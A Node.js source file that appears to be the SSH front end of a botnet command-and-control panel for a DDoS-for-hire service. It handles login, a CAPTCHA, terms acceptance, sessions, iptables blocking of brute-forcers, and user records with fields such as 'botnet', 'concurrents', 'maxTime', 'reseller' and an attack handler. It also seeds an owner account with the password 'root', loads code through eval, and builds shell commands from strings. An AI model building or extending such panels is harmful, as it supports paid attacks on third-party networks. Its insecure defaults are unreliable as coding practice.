const path = require('path');
const fs = require('fs');
const { Server } = require('ssh2');
const bcrypt = require('bcrypt');   // ✅
const { execSync } = require('child_process');

if (typeof __dirname === 'undefined') {
    global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/LogUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './handlers/CommandHandler.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/PageUtils.js'), 'utf8'));

let HostKey;
try {
    HostKey = fs.readFileSync(path.join(__dirname, './keys/host.key'));

    if (!HostKey || HostKey.length < 100) {
        throw new Error('Host key is invalid or empty');
    }
} catch (err) {
    console.error(`[SSH Server] Failed to load host key: ${err.message}`);
    process.exit(1);
}

// Brute force detection and IP blocking
const failedAttempts = new Map(); // IP -> array of timestamps
const blockedIPsFile = path.join(__dirname, './configs/blocked_ips.json');
const BLOCK_THRESHOLD = 6;
const TIME_WINDOW_MS = 30000; // 30 seconds

// Load blocked IPs from file
function loadBlockedIPs() {
    try {
        if (fs.existsSync(blockedIPsFile)) {
            const data = fs.readFileSync(blockedIPsFile, 'utf8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('[Brute Force] Error loading blocked IPs:', err.message);
    }
    return [];
}

// Save blocked IPs to file
function saveBlockedIPs(blockedIPs) {
    try {
        const dir = path.dirname(blockedIPsFile);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        fs.writeFileSync(blockedIPsFile, JSON.stringify(blockedIPs, null, 2), 'utf8');
    } catch (err) {
        console.error('[Brute Force] Error saving blocked IPs:', err.message);
    }
}

// Check if IP is IPv6
function isIPv6(ip) {
    return ip.includes(':');
}

// Block IP using iptables
function blockIP(ip) {
    try {
        const isV6 = isIPv6(ip);
        const tool = isV6 ? 'ip6tables' : 'iptables';
        
        // Check if rule already exists
        try {
            const checkCmd = `${tool} -C INPUT -p tcp --dport 10000 -s ${ip} -j DROP 2>&1`;
            execSync(checkCmd, { stdio: 'ignore' });
            // Rule exists, skip
            return true;
        } catch {
            // Rule doesn't exist, add it
        }
        
        // Add DROP rule for the IP on port 10000
        const cmd = `${tool} -I INPUT -p tcp --dport 10000 -s ${ip} -j DROP`;
        execSync(cmd, { stdio: 'ignore' });
        
        // Save iptables rules
        try {
            execSync('iptables-save > /etc/iptables.rules', { stdio: 'ignore' });
            if (isV6) {
                execSync('ip6tables-save > /etc/ip6tables.rules', { stdio: 'ignore' });
            }
        } catch (err) {
            console.warn('[Brute Force] Could not save iptables rules:', err.message);
        }
        
        console.log(`[Brute Force] Blocked IP ${ip} on port 10000`);
        return true;
    } catch (err) {
        console.error(`[Brute Force] Failed to block IP ${ip}:`, err.message);
        return false;
    }
}

// Unblock IP from iptables
function unblockIP(ip) {
    try {
        const isV6 = isIPv6(ip);
        const tool = isV6 ? 'ip6tables' : 'iptables';
        
        // Remove DROP rule for the IP on port 10000
        const cmd = `${tool} -D INPUT -p tcp --dport 10000 -s ${ip} -j DROP`;
        execSync(cmd, { stdio: 'ignore' });
        
        // Save iptables rules
        try {
            execSync('iptables-save > /etc/iptables.rules', { stdio: 'ignore' });
            if (isV6) {
                execSync('ip6tables-save > /etc/ip6tables.rules', { stdio: 'ignore' });
            }
        } catch (err) {
            console.warn('[Brute Force] Could not save iptables rules:', err.message);
        }
        
        console.log(`[Brute Force] Unblocked IP ${ip} on port 10000`);
        return true;
    } catch (err) {
        // Rule might not exist, that's okay
        return false;
    }
}

// Remove IP from blocked list
function removeBlockedIP(ip) {
    const blockedIPs = loadBlockedIPs();
    const filtered = blockedIPs.filter(entry => entry.ip !== ip);
    if (filtered.length !== blockedIPs.length) {
        saveBlockedIPs(filtered);
        return true;
    }
    return false;
}

// Check if IP is already blocked
function isIPBlocked(ip) {
    const blockedIPs = loadBlockedIPs();
    return blockedIPs.some(entry => entry.ip === ip);
}

// Add IP to blocked list
function addBlockedIP(ip) {
    const blockedIPs = loadBlockedIPs();
    const timestamp = new Date().toISOString();
    
    // Check if already in list
    if (!blockedIPs.some(entry => entry.ip === ip)) {
        blockedIPs.push({
            ip: ip,
            blockedAt: timestamp,
            attempts: BLOCK_THRESHOLD
        });
        saveBlockedIPs(blockedIPs);
    }
}

// Record failed login attempt
function recordFailedAttempt(ip) {
    const now = Date.now();
    const attempts = failedAttempts.get(ip) || [];
    
    // Add current timestamp
    attempts.push(now);
    
    // Clean up old attempts outside the 30-second window
    const recentAttempts = attempts.filter(timestamp => (now - timestamp) <= TIME_WINDOW_MS);
    failedAttempts.set(ip, recentAttempts);
    
    const count = recentAttempts.length;
    
    if (count >= BLOCK_THRESHOLD) {
        if (!isIPBlocked(ip)) {
            if (blockIP(ip)) {
                addBlockedIP(ip);
                globalThis.logToFile(
                    globalThis.LogPaths.LoginAttempts,
                    `BRUTE_FORCE_BLOCKED - IP: ${ip} - ${count} failed attempts within 30 seconds`
                );
            }
        }
    }
}

// Reset failed attempts on successful login
function resetFailedAttempts(ip) {
    failedAttempts.delete(ip);
}

// Periodic cleanup of old attempts (runs every 10 seconds)
function startCleanupInterval() {
    setInterval(() => {
        const now = Date.now();
        for (const [ip, attempts] of failedAttempts.entries()) {
            const recentAttempts = attempts.filter(timestamp => (now - timestamp) <= TIME_WINDOW_MS);
            if (recentAttempts.length === 0) {
                failedAttempts.delete(ip);
            } else {
                failedAttempts.set(ip, recentAttempts);
            }
        }
    }, 10000); // Clean up every 10 seconds
}

// Restore blocked IPs to iptables on startup
function restoreBlockedIPs() {
    const blockedIPs = loadBlockedIPs();
    let restored = 0;
    
    for (const entry of blockedIPs) {
        try {
            if (blockIP(entry.ip)) {
                restored++;
            }
        } catch (err) {
            console.warn(`[Brute Force] Failed to restore block for ${entry.ip}:`, err.message);
        }
    }
    
    if (restored > 0) {
        console.log(`[Brute Force] Restored ${restored} blocked IP(s) to iptables`);
    }
}

async function startSSHServer(config, db, attackHandler) {
// Restore previously blocked IPs
restoreBlockedIPs();

// Start periodic cleanup of old failed attempts
startCleanupInterval();

const existingRoot = await db.findDocumentByKey('username', 'root', config.mongo_db_collection);

if (!existingRoot) {
    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash('root', saltRounds);

    const rootUser = {
        username: 'root',
        password: hashedPassword,  // ✅ store bcrypt hash instead of plaintext
        role: 'owner',
        expiry: 'Lifetime',
        maxTime: 500000,
        concurrents: 25,
        admin: true,
        reseller: true,
        api: true,
        spambypass: true,
        blacklistbypass: true,
        vip: true,
        homeholder: true,
        banned: false,
        isOnline: false,
        cooldown: 0,
        botnet: true,
        owed: 0,
        earnings: 0,
        usersSold: 0,
        createdAt: new Date(),
        updatedAt: new Date()
    };

    await db.addDocument(rootUser, config.mongo_db_collection);
    console.log('[INIT] Root account created with bcrypt password.');
}
    const activeSessions = new Map();

    const server = new Server(
        {
            hostKeys: [HostKey],
            keepaliveInterval: 30 * 1000,
            banner: config?.banner_message || 'Welcome',
            // Explicitly define supported authentication methods
            authMethods: ['password', 'publickey'], // Allow password and public key authentication
        },
        async (client) => {
            let _user = null;
            let _existingSessionId = null;
            let _pauseRef = { value: false };
            const rawIp = client._sock.remoteAddress;
            const clientIP = rawIp.startsWith('::ffff:') ? rawIp.slice(7) : rawIp;
            const sessionId = `${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
            
            // Check if IP is already blocked
            if (isIPBlocked(clientIP)) {
                console.log(`[Brute Force] Blocked IP ${clientIP} attempted connection`);
                client.end();
                return;
            }

            const cleanupSession = () => {
                const session = activeSessions.get(sessionId);
                if (session?.intervals) {
                    for (const interval of session.intervals) {
                        clearInterval(interval);
                    }
                }
                activeSessions.delete(sessionId);
            };

client.on('authentication', async (ctx) => {
    try {
        if (ctx.method === 'password') {
            const username = ctx.username;
            const password = ctx.password;

            if (!username || !password) {
                globalThis.logToFile(
                    globalThis.LogPaths.LoginAttempts,
                    `FAILED - ${username || 'unknown'} - Missing credentials`
                );
                return ctx.reject(['password']);
            }

            const user = await db.findDocumentByKey(
                'username',
                username.toLowerCase(),
                config.mongo_db_collection
            );

            if (user) {
                // ✅ Compare entered password with bcrypt hash
                const isMatch = await bcrypt.compare(password, user.password);
                if (isMatch) {
                    // Reset failed attempts on successful login
                    resetFailedAttempts(clientIP);
                    
                    _existingSessionId = [...activeSessions.entries()].find(
                        ([_, session]) => session.user.username === username
                    )?.[0];
                    globalThis.logToFile(
                        globalThis.LogPaths.LoginAttempts,
                        `SUCCESS - ${username} - IP: ${clientIP} - SessionID: ${sessionId}`
                    );
                    _user = user;
                    _user.username = _user.username.toLowerCase();
                    activeSessions.set(sessionId, { user, client, stream: null, intervals: [] });
                    return ctx.accept();
                }
            }

            // Record failed attempt
            recordFailedAttempt(clientIP);
            
            // Reject if user not found or password invalid
            globalThis.logToFile(
                globalThis.LogPaths.LoginAttempts,
                `FAILED - ${username} IP: ${clientIP} - Invalid credentials`
            );
            return ctx.reject(['password']);

        } else if (ctx.method === 'publickey') {
            // Record failed attempt
            recordFailedAttempt(clientIP);
            
            globalThis.logToFile(
                globalThis.LogPaths.LoginAttempts,
                `FAILED - ${ctx.username || 'unknown'} - Public key authentication not implemented`
            );
            return ctx.reject(['password']);
        } else {
            // Record failed attempt
            recordFailedAttempt(clientIP);
            
            globalThis.logToFile(
                globalThis.LogPaths.LoginAttempts,
                `FAILED - ${ctx.username || 'unknown'} - Unsupported auth method: ${ctx.method}`
            );
            return ctx.reject(['password']);
        }
    } catch (err) {
        // Record failed attempt on error
        recordFailedAttempt(clientIP);
        console.error(`[SSH Auth Error] Client IP: ${clientIP}, Error: ${err.message}`);
        return ctx.reject(['password']);
    }
});

            client.on('ready', async () => {
                client.on('session', async (accept) => {
                    const session = accept();
                    session.on('pty', async (accept) => {
                        accept({ term: 'xterm-256color', rows: 24, cols: 80 });
                    });
                    session.on('shell', async (accept) => {
                        const stream = accept();

                        // Load user's selected theme
                        const themeManager = globalThis.themeManager;
                        let userTheme = 'default';
                        
                        if (themeManager && _user) {
                            try {
                                userTheme = await themeManager.getUserTheme(db, _user.username, config);
                            } catch (err) {
                                console.warn('[SSH] Error loading user theme:', err.message);
                            }
                        }

                        // Load page contents early for TOS (with user's theme)
                        let pageContents = themeManager 
                            ? themeManager.loadThemePages(userTheme, _user)
                            : globalThis.loadPages(config);

                        // TOS Acceptance Flow
                        const showTOS = () => {
                            return new Promise((resolve) => {
                                if (!config.ssh.tos_enabled) {
                                    resolve(true);
                                    return;
                                }

                                // Check if user is in bypass list
                                if (config.ssh.tos_bypass_users && Array.isArray(config.ssh.tos_bypass_users)) {
                                    const isBypassed = config.ssh.tos_bypass_users.some(
                                        bypassUser => bypassUser.toLowerCase() === _user?.username?.toLowerCase()
                                    );
                                    
                                    if (isBypassed) {
                                        globalThis.logToFile(
                                            globalThis.LogPaths.LoginAttempts,
                                            `TOS BYPASSED - ${_user?.username || 'Unknown'} - SessionID: ${sessionId}`
                                        );
                                        resolve(true);
                                        return;
                                    }
                                }

                                const tosContent = pageContents.tos || '';
                                if (!tosContent) {
                                    console.warn('[TOS] TOS enabled but content not found in pages/tos.tfx');
                                    resolve(true);
                                    return;
                                }

                                stream.write('\x1B[2J\x1B[H');
                                stream.write(tosContent);
                                stream.write('\r\n\r\n');
                                stream.write('\x1b[33m[!] Terms of Service Agreement\x1b[0m\r\n');
                                stream.write('\x1b[97mDo you accept the Terms of Service? (yes/no): \x1b[0m');

                                let tosBuffer = '';

                                const handleTOSInput = (chunk) => {
                                    const input = chunk.toString('utf-8');

                                    if (input.startsWith('\x1b')) {
                                        return;
                                    }

                                    if (input === '\r' || input === '\n') {
                                        stream.write('\r\n');
                                        const answer = tosBuffer.trim().toLowerCase();
                                        
                                        stream.removeListener('data', handleTOSInput);

                                        if (['yes', 'y', 'accept'].includes(answer)) {
                                            globalThis.logToFile(
                                                globalThis.LogPaths.LoginAttempts,
                                                `TOS ACCEPTED - ${_user?.username || 'Unknown'} - SessionID: ${sessionId}`
                                            );
                                            stream.write('\x1b[32m✓ Terms of Service accepted.\x1b[0m\r\n');
                                            setTimeout(() => {
                                                resolve(true);
                                            }, 500);
                                        } else {
                                            globalThis.logToFile(
                                                globalThis.LogPaths.LoginAttempts,
                                                `TOS DECLINED - ${_user?.username || 'Unknown'} - SessionID: ${sessionId}`
                                            );
                                            stream.write('\x1b[31m✗ You must accept the Terms of Service to continue.\x1b[0m\r\n');
                                            stream.write('\x1b[31mDisconnecting...\x1b[0m\r\n');
                                            setTimeout(() => {
                                                stream.end();
                                                client.end();
                                                resolve(false);
                                            }, 1000);
                                        }
                                        return;
                                    }

                                    if (input === '\x7f' || input === '\b') {
                                        if (tosBuffer.length > 0) {
                                            tosBuffer = tosBuffer.slice(0, -1);
                                            stream.write('\b \b');
                                        }
                                    } else {
                                        tosBuffer += input;
                                        stream.write(input);
                                    }
                                };

                                stream.on('data', handleTOSInput);
                            });
                        };

                        async function continueShell() {
                            // Debug expiration check
                            globalThis.logToFile(
                                globalThis.LogPaths.LoginAttempts,
                                `DEBUG - Checking expiration for ${_user.username} - User data: ${JSON.stringify(_user)}`
                            );

                            const expired = await globalThis.isUserExpired(config, db, _user);

                            if (_user.expiry !== 'Lifetime' && expired) {
                                globalThis.logToFile(
                                    globalThis.LogPaths.LoginAttempts,
                                    `FAILED - ${_user.username} - Account expired`
                                );
                                stream.write('\x1b[31mYour account has expired. Contact support.\x1b[0m\r\n');
                                stream.write(`\x1b[31mDisconnecting from ${clientIP} due to expired account.\x1b[0m\r\n`);
                                setTimeout(() => {
                                    stream.end();
                                    client.end();
                                }, 500);
                                return;
                            }
                            if (_user.banned) {
                                globalThis.logToFile(
                                    globalThis.LogPaths.LoginAttempts,
                                    `FAILED - ${_user.username} - Account banned`
                                );
                                stream.write('\x1b[31mYour account has been banned. Access denied.\x1b[0m\r\n');
                                stream.write(`\x1b[31mDisconnecting from ${clientIP} due to banned account.\x1b[0m\r\n`);
                                setTimeout(() => {
                                    stream.end();
                                    client.end();
                                }, 500);
                                return;
                            }

                            // pageContents already loaded at the top of shell session

                            activeSessions.get(sessionId).stream = stream;
                            stream.write('\x1B[2J\x1B[H');

                            let buffer = '',
                                cursorPosition = 0,
                                historyIndex = -1;
                            let commandHistory = [];
                            let lastDrawnLengthRef = { value: 0 };
                            let rawPrompt = globalThis.replaceCNCname(
                                globalThis.replaceUsername(pageContents.prompt.trimEnd(), _user),
                                config.cnc_name
                            );
                            let promptLines = rawPrompt.split(/\r?\n/);
                            let promptText = promptLines[promptLines.length - 1];
                            let promptLength = globalThis.stripAnsi(promptText).length;

                            const titleInterval = setInterval(() => {
                                const dedupedSessions = new Map();
                                for (const session of activeSessions.values()) {
                                    if (session?.user?.username) {
                                        dedupedSessions.set(session.user.username, session);
                                    }
                                }
                                try {
                                    stream.write(
                                        `\x1b]0;${globalThis.replaceTitle(
                                            pageContents.title,
                                            config,
                                            dedupedSessions,
                                            attackHandler,
                                            _user
                                        )}\x07`
                                    );
                                } catch (err) {
                                    console.error(`[Interval Error] Failed to write title: ${err.message}`);
                                }
                            }, 1000);

                            const userInterval = setInterval(async () => {
                                pageContents = globalThis.loadPages(config);
                                _user = await db.findDocumentByKey(
                                    'username',
                                    _user.username.toLowerCase(),
                                    config.mongo_db_collection
                                );
                                _user.username = _user.username.toLowerCase();
                                rawPrompt = globalThis.replaceCNCname(
                                    globalThis.replaceUsername(pageContents.prompt.trimEnd(), _user),
                                    config.cnc_name
                                );
                                promptLines = rawPrompt.split(/\r?\n/);
                                promptText = promptLines[promptLines.length - 1];
                                promptLength = globalThis.stripAnsi(promptText).length;
                                const session = activeSessions.get(sessionId);
                                if (session) {
                                    session.user = _user;
                                } else {
                                    console.warn(`Session with ID ${sessionId} not found in activeSessions.`);
                                    clearInterval(userInterval);
                                }
                            }, 5000);

                            activeSessions.get(sessionId).intervals.push(titleInterval);
                            activeSessions.get(sessionId).intervals.push(userInterval);

                            if (_existingSessionId) {
                                buffer = '';
                                cursorPosition = 0;
                                stream.write('\x1B[2J\x1B[H');
                                stream.write(`\x1b[31m[!] You are already logged in elsewhere.\x1b[0m\r\n`);
                                stream.write(`\x1b[97mDo you want to close your previous session and continue here? (yes/no)\x1b[0m\r\n`);
                                if (promptLines.length > 1) {
                                    for (let i = 0; i < promptLines.length - 1; ++i) {
                                        stream.write(promptLines[i] + '\n');
                                    }
                                }
                                stream.write(`\r${promptText}`);
                                lastDrawnLengthRef.value = 0;
                            } else if (pageContents.home_page) {
                                stream.write('\x1B[2J\x1B[H');
                                stream.write(globalThis.replaceUsername(pageContents.home_page, _user));
                                if (promptLines.length > 1) {
                                    for (let i = 0; i < promptLines.length - 1; ++i) {
                                        stream.write(promptLines[i] + '\n');
                                    }
                                }
                                stream.write(`\r${promptText}`);
                                lastDrawnLengthRef.value = 0;
                            }

                            stream.on('data', async (data) => {
                                if (_pauseRef.value === true) {
                                    return;
                                }

                                const input = data.toString('utf-8');
                                if (input.startsWith('\x1b')) {
                                    if (input === '\x1b[A') {
                                        if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) {
                                            historyIndex++;
                                            buffer = commandHistory[commandHistory.length - 1 - historyIndex];
                                            cursorPosition = buffer.length;
                                            globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                        }
                                    } else if (input === '\x1b[B') {
                                        if (historyIndex > 0) {
                                            historyIndex--;
                                            buffer = commandHistory[commandHistory.length - 1 - historyIndex];
                                        } else {
                                            historyIndex = -1;
                                            buffer = '';
                                        }
                                        cursorPosition = buffer.length;
                                        globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                    } else if (input === '\x1b[D' && cursorPosition > 0) {
                                        cursorPosition--;
                                        stream.write('\x1b[D');
                                    } else if (input === '\x1b[C' && cursorPosition < buffer.length) {
                                        cursorPosition++;
                                        stream.write('\x1b[C');
                                    }
                                    return;
                                }

                                if (input === '\r' || input === '\n') {
                                    stream.write('\r\n');
                                    const cleanInput = buffer.trim();
                                    if (cleanInput) commandHistory.push(cleanInput);
                                    historyIndex = -1;
                                    if (_existingSessionId) {
                                        if (['yes', 'y'].includes(cleanInput.toLowerCase())) {
                                            const oldClient = activeSessions.get(_existingSessionId)?.client;
                                            if (oldClient) oldClient.end();
                                            activeSessions.delete(_existingSessionId);
                                            _existingSessionId = null;
                                            stream.write(`\x1b[32mOld session closed. Redirecting...\x1b[0m\r\n`);
                                            setTimeout(() => {
                                                stream.write('\x1B[2J\x1B[H');
                                                stream.write(globalThis.replaceUsername(pageContents.home_page, _user));
                                                stream.write(`\r${promptText}`);
                                                lastDrawnLengthRef.value = 0;
                                            }, 1000);
                                        } else {
                                            stream.write('\x1b[31m[48;5;238m[97mSession aborted.\x1b[0m\r\n');
                                            setTimeout(() => {
                                                stream.end();
                                                client.end();
                                            }, 500);
                                        }
                                    } else {
                                        const [command, ...params] = cleanInput.split(' ');
                                        const CMD_OBJ = {
                                            command: command.toLowerCase(),
                                            params,
                                            client,
                                            stream,
                                            pageContents,
                                            user: _user,
                                            attackHandler,
                                            db,
                                            config,
                                            activeSessions,
                                            pauseRef: _pauseRef,
                                        };
                                        await globalThis.HandleCommands(CMD_OBJ);
                                    }
                                    buffer = '';
                                    cursorPosition = 0;
                                    if (promptLines.length > 1) {
                                        for (let i = 0; i < promptLines.length - 1; ++i) {
                                            stream.write(promptLines[i] + '\n');
                                        }
                                    }
                                    stream.write(`\r${promptText}`);
                                    lastDrawnLengthRef.value = 0;
                                    return;
                                }
                                if (input === '\x7f' || input === '\b') {
                                    if (cursorPosition > 0) {
                                        buffer = buffer.slice(0, cursorPosition - 1) + buffer.slice(cursorPosition);
                                        cursorPosition--;
                                        globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                    }
                                    return;
                                }
                                buffer = buffer.slice(0, cursorPosition) + input + buffer.slice(cursorPosition);
                                cursorPosition += input.length;
                                globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                            });
                        }

                        if (config.ssh.captcha_enabled) {
                            let captchaPassed = false;
                            let attempts = 0;
                            const maxAttempts = 3;
                            const chars = 'ACEFGHJL4989';
                            const captchaText = Array(4)
                                .fill()
                                .map(() => chars.charAt(Math.floor(Math.random() * chars.length)))
                                .join('');

                            const asciiFont = {
                                A: ["╔══╗ ", "║  ║ ", "╠══╣ ", "║  ║ ", "║  ║ "],
                                C: ["╔══╗ ", "║    ", "║    ", "╚══╝ ", "     "],
                                E: ["╔═══ ", "╠═══ ", "╚═══ ", "     ", "     "],
                                F: ["╔═══ ", "╠═══ ", "║    ", "║    ", "     "],
                                G: ["╔══╗ ", "║    ", "║ ╔╗ ", "╚═╩╝ ", "     "],
                                H: ["║  ║ ", "╠══╣ ", "║  ║ ", "║  ║ ", "║  ║ "],
                                J: ["   ║ ", "   ║ ", "║  ║ ", "╚══╝ ", "     "],
                                L: ["║    ", "║    ", "║    ", "╚═══ ", "     "],
                                '4': ["║  ║ ", "╚══║ ", "   ║ ", "   ║ ", "     "],
                                '7': ["╔══╗ ", "   ║ ", "  ╔╝ ", "  ║  ", "     "],
                                '8': ["╔══╗ ", "║  ║ ", "╠══╣ ", "╚══╝ ", "     "],
                                '9': ["╔══╗ ", "║  ║ ", "╚══╣ ", "   ║ ", "   ║ "],
                            };

                            const asciiLines = ["", "", "", "", ""];
                            for (const char of captchaText) {
                                const art = asciiFont[char.toUpperCase()] || ["     ", "     ", "     ", "     ", "     "];
                                for (let i = 0; i < asciiLines.length; i++) {
                                    asciiLines[i] += art[i] + "  ";
                                }
                            }

                            stream.write('\x1B[2J\x1B[H');
                            stream.write('\x1b[33m[!] Verification Required\x1b[0m\r\n');
                            stream.write('\x1b[0mType the following CAPTCHA to continue:\x1b[0m\r\n\n');
                            stream.write('\x1b[97m' + asciiLines.join('\r\n') + '\x1b[0m\r\n\n');
                            stream.write('\x1b[97mAnswer: \x1b[0m');

                            let captchaBuffer = '';

                            const handleCaptchaInput = (chunk) => {
                                const input = chunk.toString('utf-8');

                                if (input.startsWith('\x1b')) {
                                    return;
                                }

                                if (input === '\r' || input === '\n') {
                                    stream.write('\r\n');
                                    if (captchaBuffer.trim() === captchaText) {
                                        globalThis.logToFile(
                                            globalThis.LogPaths.CaptchaLogs,
                                            `CAPTCHA PASS - ${_user?.username || 'Unknown'} - SessionID: ${sessionId}`
                                        );
                                        captchaPassed = true;
                                        stream.removeListener('data', handleCaptchaInput);
                                        stream.write('\x1b[32mCorrect! Access granted.\x1b[0m\r\n');
                                        setTimeout(async () => {
                                            stream.write('\x1B[2J\x1B[H');
                                            // Show TOS after captcha
                                            const tosAccepted = await showTOS();
                                            if (tosAccepted) {
                                                continueShell();
                                            }
                                        }, 500);
                                    } else {
                                        attempts++;
                                        if (attempts >= maxAttempts) {
                                            globalThis.logToFile(
                                                globalThis.LogPaths.CaptchaLogs,
                                                `CAPTCHA FAIL - ${_user?.username || 'Unknown'} - SessionID: ${sessionId}`
                                            );
                                            stream.write('\x1b[31m[48;5;238m[97mToo many incorrect answers. Connection closed.\x1b[0m\r\n');
                                            setTimeout(() => {
                                                stream.end();
                                                client.end();
                                            }, 500);
                                        } else {
                                            captchaBuffer = '';
                                            stream.write(
                                                `\x1b[31m[!] Incorrect. Try again (${maxAttempts - attempts} tries left)\x1b[0m\r\n`
                                            );
                                            stream.write('\x1b[97mAnswer: \x1b[0m');
                                        }
                                    }
                                    return;
                                }

                                if (input === '\x7f' || input === '\b') {
                                    if (captchaBuffer.length > 0) {
                                        captchaBuffer = captchaBuffer.slice(0, -1);
                                        stream.write('\b \b');
                                    }
                                } else {
                                    captchaBuffer += input;
                                    stream.write(input);
                                }
                            };
                            stream.on('data', handleCaptchaInput);
                        } else {
                            // Show TOS before shell if captcha is disabled
                            showTOS().then((tosAccepted) => {
                                if (tosAccepted) {
                                    continueShell();
                                }
                            });
                        }
                    });
                });
                client.on('end', cleanupSession);
                client.on('close', cleanupSession);
                client.on('disconnect', cleanupSession);
                client.on('error', (err) => {
                    if (err.code !== 'ECONNRESET') {
                        console.error(`[SSH ERROR] Client IP: ${clientIP}, SessionID: ${sessionId}, Error: ${err.code} - ${err.message}`);
                    }
                    cleanupSession();
                });
            });
        }
    );

    server.listen(config.ssh.port, '0.0.0.0', () => {
        const datetime = new Date();

const formatted = `${datetime.getFullYear()}-${String(datetime.getMonth() + 1).padStart(2, '0')}-${String(datetime.getDate()).padStart(2, '0')} ${String(datetime.getHours()).padStart(2, '0')}:${String(datetime.getMinutes()).padStart(2, '0')}:${String(datetime.getSeconds()).padStart(2, '0')}`;
        console.log(`${formatted} [OK] [48;5;238m[97mSSH server listening on port ${config.ssh.port}\x1b[0m`);
    });
}

// Export functions for use in CommandHandler
globalThis.getBlockedIPs = loadBlockedIPs;
globalThis.isIPBlocked = isIPBlocked;
globalThis.unblockIP = unblockIP;
globalThis.removeBlockedIP = removeBlockedIP;

globalThis.startSSHServer = startSSHServer;